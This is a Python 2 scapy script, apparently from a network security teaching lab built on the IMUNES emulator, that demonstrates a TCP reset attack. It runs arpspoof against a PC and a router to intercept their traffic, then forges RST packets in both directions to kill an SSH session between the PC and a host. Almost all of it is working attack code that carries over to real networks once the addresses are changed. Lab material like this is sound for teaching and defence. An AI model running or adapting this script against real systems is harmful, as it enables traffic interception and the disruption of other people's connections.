#! /usr/bin/env python2
'''
TCP reset attack demo.

Start IMUNES experiment:
# imunes -b ../service.imn

Open new window on node PC or use himage and start ssh session from PC to Host:
# himage PC ssh imunes@10.0.1.10

Copy the script to the Attacker host and start it:
# hcp tcprst.py Attacker:
# himage Attacker ./tcprst.py
--> the result of the script is "Broken pipe" in ssh session between PC and Host.
'''

from scapy.all import *
import os
import platform

PC="10.0.0.20"
Host="10.0.1.10"
Service=22
Router="10.0.0.1"

def isOSlinux():
    if platform.system() == "Linux":
        return True
    else:
        return False

def callback(pkt):
    if TCP in pkt:  
        if pkt[TCP].flags & 6 != 0: 
            return     # skip three-way handshake and RST (SYN=2, RST=4)
        if pkt[IP].src == Host and pkt[IP].dst == PC and pkt[TCP].sport == Service:
            # received packet from Host to PC, spoof RST response from PC to Host and from Host to PC:
            # ACK field from the received packet is used as sequence number to send RST 
            print ""
            print "Sending spoofed RST PC->Host"
            packet = IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, seq=pkt[TCP].ack, flags="R")
            send(packet, verbose=False)
            print "Sending spoofed RST Host->PC"
            packet = IP(dst=pkt[IP].dst, src=pkt[IP].src)/TCP(dport=pkt[TCP].dport, sport=pkt[TCP].sport, seq=pkt[TCP].seq, flags="R")
            send(packet, verbose=False)
            # os.system("killall -9 arpspoof")
            # exit(0)

if os.uname()[1] != "Attacker":
    print "The script should be started on the Attacker host:"
    print "    hcp tcprst.py Attacker:"
    print "    himage Attacker ./tcprst.py"
    exit(2)

# enable IP packet forwarding and disable sending of IP redirects
if isOSlinux():
    os.system("sysctl -w net.ipv4.conf.eth0.forwarding=1")
else:
    os.system("sysctl -w net.inet.ip.forwarding=1")
    os.system("sysctl -w net.inet.ip.redirect=0")

# ARP spoofing (to enable snooping on Attacker host):
# - tell the Router that the PC has the Attacker MAC and
# - tell the PC that the Router has the Attacker MAC.
#
print "ARP spoofing attack on PC and Router..."
os.system("arpspoof -i eth0 -t " + Router + " " + PC +" 2> /dev/null &")
os.system("arpspoof -i eth0 -t " + PC + " " + Router + " 2> /dev/null &")


print "Reading packets between PC and Host..."
sniff(prn=callback, filter="tcp", store=0)

